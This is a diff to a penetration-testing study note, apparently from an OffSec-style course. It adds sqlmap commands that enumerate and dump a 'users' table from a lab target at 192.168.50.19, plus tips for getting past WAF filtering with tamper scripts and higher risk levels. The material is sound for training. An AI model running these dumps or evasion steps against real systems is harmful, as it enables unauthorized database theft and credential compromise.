@@ -46,6 +46,21 @@ sqlmap -u
 > ```
 > Because this is a time-based blind SQLi, extraction is slow (sqlmap auto-adjusts the delay), but it eventually recovers every user's hashed credentials.
 
+> [!example] Scoping the dump instead of grabbing everything
+> `--dump` with no scope enumerates and dumps the *entire* server, which is slow and noisy. Narrow it down step by step instead:
+> ```sh
+> sqlmap -u "http://192.168.50.19/blindsqli.php?user=1" -p user --dbs              # list databases
+> sqlmap -u "http://192.168.50.19/blindsqli.php?user=1" -p user -D offsec --tables # list tables in offsec
+> sqlmap -u "http://192.168.50.19/blindsqli.php?user=1" -p user -D offsec -T users --columns  # list columns
+> sqlmap -u "http://192.168.50.19/blindsqli.php?user=1" -p user -D offsec -T users --dump     # dump just that table
+> ```
+
+> [!tip] When the default scan finds nothing or the app is WAF-protected
+> - Push harder: `--level=5 --risk=3` tries far more injection points and payload variants (slower, but catches what the defaults miss).
+> - If keywords are being filtered/blocked, add a tamper script (chainable with commas): `--tamper=space2comment,between,charencode`.
+> - Pin the DBMS to skip fingerprinting noise: `--dbms=mysql`.
+> - Always prefer `-r request.txt` over `-u` for POST/login forms — a raw Burp-saved request carries cookies, headers, and the exact body sqlmap needs.
+
 Another sqlmap core feature is the
 
 ## --os-shell
